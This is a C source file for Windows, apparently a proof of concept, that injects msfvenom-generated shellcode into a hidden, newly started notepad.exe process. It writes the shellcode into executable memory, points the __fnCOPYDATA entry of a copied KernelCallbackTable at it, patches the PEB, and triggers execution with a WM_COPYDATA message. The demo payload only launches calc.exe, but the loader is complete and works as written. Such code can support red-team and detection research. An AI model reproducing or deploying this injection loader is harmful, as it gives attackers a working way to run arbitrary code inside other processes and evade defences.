#include <Windows.h>
#include <stdio.h>
#include "struct.h"
#include "macros.h"


// msfvenom -p windows/x64/exec CMD=calc.exe -f c
unsigned char payload[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
SIZE_T payloadSize = sizeof(payload);

int main(int argc, char** argv) {
    PROCESS_BASIC_INFORMATION pbi;
    PEB peb;
    SIZE_T dwBytesRead = 0;
    KERNELCALLBACKTABLE kct;
    COPYDATASTRUCT cds;
    LPVOID pBaseAddress;
    LPVOID pNewKCT;
    NTSTATUS status;
    PROCESS_INFORMATION pi;
    STARTUPINFO si = { sizeof(STARTUPINFO) };

    // Get handle to process
    /*hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    printf("Process PID %d HANDLE 0x%p\n", PID, hProc);*/

    // Create Sacrifical Process
    info("Creating sacrifical process.");
    
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    ok("Process %d created", pi.hProcess);

    Sleep(1000);

    // Resolve NtQueryInformationProcess
    info("Resolving NtQueryInformationProcess().");
    tNtQueryInformationProcess pNtQueryInformationProcess = (tNtQueryInformationProcess)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
    ok("NtQueryInformationProcess() at 0x%p", pNtQueryInformationProcess);

    // Read PBI
    info("Reading PEB and KCT.");
    status = pNtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
    if (status != 0) {
        error("Failed to read PEB and KCT, error: 0x%x", status);
        TerminateProcess(pi.hProcess, 1);
        return EXIT_FAILURE;
    }
    ok("PROCESS_BASIC_INFORMATION at 0x%p", pbi);
    ok("PEB Base address: 0x%p", pbi.PebBaseAddress);

    // Read PEB
    if (ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), &dwBytesRead) == 0) {
        error("Failed to read PEB, error: %ld", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return EXIT_FAILURE;
    }
    ok("KernelCallbackTable at 0x%p", peb.KernelCallbackTable);
    
    // Read KCT
    info("Reading KernelCallbackTable.");
    if (ReadProcessMemory(pi.hProcess, peb.KernelCallbackTable, &kct, sizeof(KERNELCALLBACKTABLE), &dwBytesRead) == 0) {
        error("Failed to read KernelCallbackTable, error: %ld", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return EXIT_FAILURE;
    }
    ok("KERNELCALLBACKTABLE.__fnCOPYDATA at 0x%p. Read %zu bytes", kct.__fnCOPYDATA, dwBytesRead);

    // Allocate and copy payload
    info("Copying payload to process.");
    pBaseAddress = VirtualAllocEx(pi.hProcess, NULL, payloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (pBaseAddress == NULL) {
        error("Failed to allocate memory for payload, error: %ld", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return EXIT_FAILURE;
    }
    if (WriteProcessMemory(pi.hProcess, pBaseAddress, payload, payloadSize, &dwBytesRead) == 0) {
        error("Failed to write payload to allocated regeion, error: %ld", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return EXIT_FAILURE;
    }

    // modify and copy KCT
    info("Creating modified KernelCallbackTable.");
    pNewKCT = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pNewKCT == NULL) {
        error("Failed to allocate memory for modifed KernelCallbackTable, error %ld", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return EXIT_FAILURE;
    }

    kct.__fnCOPYDATA = (ULONG_PTR)pBaseAddress;
    if (WriteProcessMemory(pi.hProcess, pNewKCT, &kct, sizeof(KERNELCALLBACKTABLE), NULL) == 0) {
        error("Failed to write modified KernelCallbackTable to allocated regeion, error: %ld", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return EXIT_FAILURE;
    }
    ok("Payload at 0x%p, Modified KernelCallbackTable at 0x%p", pBaseAddress, pNewKCT);

    // Update PEB
    info("Patching PEB.");
    if (WriteProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &pNewKCT, sizeof(ULONG_PTR), NULL) == 0) {
        error("Failed to patch PEB, error: %ld", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return EXIT_FAILURE;
    }
    ok("PEB.KernelCallbackTable now points to 0x%p", pBaseAddress);

    // preparing data to be send looping through all HWND owned by our PID
    info("Finding useable window.");
    cds.dwData = 1;
    cds.cbData = 4;
    cds.lpData = (PVOID)"AAAA";

    HWND hWnd = NULL;
    DWORD dwWindowPID = 0;
    do
    {
        hWnd = FindWindowEx(NULL, hWnd, NULL, NULL);
        GetWindowThreadProcessId(hWnd, &dwWindowPID);
        if (dwWindowPID == pi.dwProcessId) {
            ok("Found window 0x%p belonging to process %d", hWnd, pi.dwProcessId);

            // Trigger payload
            info("Triggering callback.");
            SendMessage(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds);
            ok("Callback triggered, enjoy!");
            //printf("GetLastError returned %d\n", GetLastError());
            //printf("Result: %s", result);
            break;
        }
    } while (hWnd != NULL);

    // Cleanup stuff that isnt needed when creating a sacrifical process
    /*status = WriteProcessMemory(hProc, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &peb.KernelCallbackTable, sizeof(ULONG_PTR), NULL);

    VirtualFreeEx(hProc, pBaseAddress, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hProc, pNewKCT, 0, MEM_DECOMMIT | MEM_RELEASE);

    CloseHandle(hProc);*/
    //CloseHandle(hWnd); - The loop continues going until there are no windows, so when we exit the loop hWnd is null. CloseHandle(NULL) will obviously throw an invalid handle exception

    return 0;
}